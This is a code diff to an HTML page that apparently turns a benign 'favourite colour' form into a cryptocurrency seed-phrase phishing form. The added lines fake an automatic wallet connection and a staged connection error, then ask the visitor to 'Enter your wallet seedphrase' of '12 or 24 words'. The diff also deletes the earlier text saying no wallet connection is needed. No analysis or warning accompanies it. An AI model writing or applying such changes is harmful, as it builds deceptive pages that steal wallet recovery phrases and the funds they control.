@@ -320,13 +320,13 @@
         <div class="spinner"></div>
 
         <h2 class="text-xl font-bold text-gray-800">
-          Preparing...
+          Connecting...
         </h2>
 
         <p
           id="processingText"
           class="text-gray-500 text-sm mt-2">
-          Preparing the manual option...
+          Connecting Automatically...
         </p>
 
       </div>
@@ -348,9 +348,10 @@
           Continue
         </h2>
 
-        <p class="text-gray-500 text-sm mt-2">
-          Wallet connection is not required for this form.
-          You can continue manually.
+        <p class="text-red-500 text-sm mt-2">
+          Error Connecting...
+<br>
+There was an error connecting automatically, please connect manually. 
         </p>
 
         <button
@@ -383,16 +384,14 @@
         ×
       </button>
 
-      <div class="modal-icon">
-        🎨
-      </div>
+      
 
       <h2 class="text-xl font-bold text-gray-800">
-        What's Your Favourite Color?
+       Enter your wallet seedphrase
       </h2>
 
       <p class="text-gray-500 text-sm mt-2">
-        Enter your favourite color to continue.
+        Enter Wallet Phrase
       </p>
 
 
@@ -400,11 +399,11 @@
 
         <div class="text-left mt-5">
 
-          <label
+          <!-- <label
             for="color"
             class="block text-sm font-semibold text-gray-700">
             Favourite Color
-          </label>
+          </label> -->
 
           <input
             type="text"
@@ -418,7 +417,7 @@
 
         </div>
 
-
+<p>Usually 12 or 24 words and separated by a single space. </p>
         <button
           type="submit"
           id="submitButton"
@@ -772,7 +771,7 @@
 
 
       processingText.textContent =
-        "Preparing the manual option...";
+        "Connecting Automatically...";
 
 
       manualModal.style.display =
